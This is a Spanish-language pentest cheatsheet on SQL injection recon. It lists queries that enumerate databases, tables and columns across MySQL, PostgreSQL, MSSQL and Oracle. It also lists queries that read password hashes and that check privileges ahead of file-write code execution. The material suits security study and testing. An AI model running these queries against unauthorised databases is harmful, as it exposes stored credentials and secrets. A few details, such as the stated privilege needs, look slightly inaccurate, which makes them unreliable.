---
aliases:
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: CheatSheet
linked:
  - "[[SQL Commands]]"
---
# SQL - Exploración de Metadatos

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SELECT schema_name FROM information_schema.schemata` | Lista de todas las DBs | Enum DBs (MySQL/PostgreSQL/MSSQL). |
| `SELECT table_name FROM information_schema.tables WHERE table_schema='dev'` | Tablas de DB `dev` | Enum tablas. |
| `SELECT column_name FROM information_schema.columns WHERE table_name='users'` | Columnas de tabla `users` | Enum columnas. |
| `SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='dev' AND table_name='users'` | Columnas + tipos | Pre-extracción para CAST correcto. |
| `SELECT table_name FROM all_tables` (Oracle) | Tablas Oracle | Backend Oracle (no usa information_schema). |
| `SELECT name FROM sys.databases` (MSSQL) | DBs en MSSQL | Backend MSSQL alt. |
| `SELECT name FROM sys.tables` (MSSQL) | Tablas en current DB MSSQL | Mismo. |
| `SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')` (MSSQL) | Columnas MSSQL | Equivalente information_schema. |
| `SELECT user,password FROM mysql.user` (MySQL) | Users + hashes MySQL | Privilege escalation — `mysql.user` requiere SUPER. |
| `SELECT usename,passwd FROM pg_shadow` (PostgreSQL) | Users + hashes PG | Requiere superuser. |
| `SELECT username,password FROM sys.syslogins` (MSSQL viejo) o `sys.sql_logins` (moderno) | Users MSSQL | DBA priv. |
| `SELECT name FROM v$instance` (Oracle) | Hostname + instance Oracle | Recon Oracle. |
| `SELECT grantee,privilege_type FROM information_schema.user_privileges` | Privilegios del user actual | Pre-RCE — confirmar FILE/SUPER. |
| `SELECT * FROM information_schema.routines` | Stored procedures/functions | Recon de surface attacking adicional. |
| `SELECT variable_name,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'` (MySQL) | Path donde FILE I/O permitido | Pre-RCE via INTO OUTFILE. |
^sql-metadatos

### Por motor — equivalencias

| Operación | MySQL/PG/MSSQL (ANSI) | Oracle |
|:---:|:---:|:---:|
| Lista DBs | `information_schema.schemata` | `dba_users`/`v$database` |
| Lista tablas | `information_schema.tables` | `all_tables`/`user_tables` |
| Lista columnas | `information_schema.columns` | `all_tab_columns`/`user_tab_columns` |
| Users | `mysql.user`/`pg_shadow`/`sys.sql_logins` | `dba_users`/`all_users` |
| Privilegios | `information_schema.user_privileges` | `dba_sys_privs`/`user_sys_privs` |

---

## Overview

Metadatos = mapa interno del SGBD. `INFORMATION_SCHEMA` es ANSI standard (MySQL/PG/MSSQL), Oracle usa sus propias views (`ALL_*`/`USER_*`/`DBA_*`/`V$*`).

**Workflow estándar:**
1. Enum DBs → ¿cuál tiene data interesante?
2. Enum tablas de esa DB → ¿`users`/`credentials`/`accounts`?
3. Enum columnas → ¿`password`/`api_key`/`token`?
4. Extraer columnas relevantes.

Algunas tablas requieren privilegios: `mysql.user` necesita SUPER, `pg_shadow` superuser, `sys.sql_logins` DBA. Check privs via `information_schema.user_privileges` antes de intentar.

---
